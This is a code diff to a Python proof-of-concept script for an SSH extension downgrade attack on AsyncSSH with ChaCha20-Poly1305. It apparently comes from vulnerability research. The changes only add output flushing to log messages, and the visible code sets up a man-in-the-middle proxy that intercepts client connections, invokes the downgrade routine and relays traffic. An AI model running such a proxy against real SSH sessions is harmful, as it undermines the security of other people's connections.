@@ -23,22 +23,22 @@ import click
 @click.option("--server-ip", help="The IP address where the AsyncSSH server is running.")
 @click.option("--server-port", default=22, help="The port where the AsyncSSH server is running.")
 def cli(proxy_ip, proxy_port, server_ip, server_port):
-    print("--- Proof of Concept for extension downgrade attack (ChaCha20-Poly1305) ---")
+    print("--- Proof of Concept for extension downgrade attack (ChaCha20-Poly1305) ---", flush=True)
     mitm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     mitm_socket.bind((proxy_ip, proxy_port))
     mitm_socket.listen(5)
 
-    print(f"[+] MitM Proxy started. Listening on {(proxy_ip, proxy_port)} for incoming connections...")
+    print(f"[+] MitM Proxy started. Listening on {(proxy_ip, proxy_port)} for incoming connections...", flush=True)
     try:
         while True:
             client_socket, client_addr = mitm_socket.accept()
-            print(f"[+] Accepted connection from: {client_addr}")
-            print(f"[+] Establishing new target connection to {(server_ip, server_port)}.")
+            print(f"[+] Accepted connection from: {client_addr}", flush=True)
+            print(f"[+] Establishing new target connection to {(server_ip, server_port)}.", flush=True)
             server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             server_socket.connect((server_ip, server_port))
-            print("[+] Performing extension downgrade")
+            print("[+] Performing extension downgrade", flush=True)
             perform_attack(client_socket, server_socket)
-            print("[+] Downgrade performed. Spawning new forwarding threads to handle client connection from now on.")
+            print("[+] Downgrade performed. Spawning new forwarding threads to handle client connection from now on.", flush=True)
             forward_client_to_server_thread = Thread(target=pipe_socket_stream, args=(client_socket, server_socket), daemon=True)
             forward_client_to_server_thread.start()
             forward_server_to_client_thread = Thread(target=pipe_socket_stream, args=(server_socket, client_socket), daemon=True)
@@ -58,9 +58,9 @@ def pipe_socket_stream(in_socket, out_socket):
                 break
             out_socket.send(data)
     except ConnectionResetError:
-        print("[!] Socket connection has been reset. Closing sockets.")
+        print("[!] Socket connection has been reset. Closing sockets.", flush=True)
     except OSError:
-        print("[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.")
+        print("[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.", flush=True)
     in_socket.close()
     out_socket.close()
 
